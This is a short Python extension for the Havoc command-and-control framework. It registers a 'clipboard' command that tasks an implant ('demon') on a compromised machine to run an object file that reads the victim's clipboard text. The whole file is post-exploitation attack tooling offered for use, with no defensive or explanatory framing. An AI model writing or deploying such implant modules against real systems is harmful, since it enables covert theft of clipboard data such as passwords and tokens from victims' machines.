from havoc import Demon, RegisterCommand, RegisterModule

def clipboard_read( demonID, *params ):
    TaskID : str   = None
    demon  : Demon = None
    demon  = Demon( demonID )
    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon to read clipboard contents" )
    demon.InlineExecute( TaskID, "go", "bin/clipboard.x64.o", b'', False )
    return TaskID

RegisterCommand( clipboard_read, "", "clipboard", "Read the current clipboard text content", 0, "", "" )
